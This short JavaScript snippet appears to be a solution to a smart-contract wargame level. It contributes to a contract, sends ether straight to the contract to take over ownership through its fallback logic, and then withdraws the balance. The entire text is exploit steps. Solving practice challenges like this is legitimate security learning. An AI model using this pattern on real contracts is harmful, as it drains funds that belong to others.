await contract.contribute.sendTransaction({value:1})
await web3.eth.sendTransaction({from: player, to: contract.address, value: 1})
await contract.withdraw()
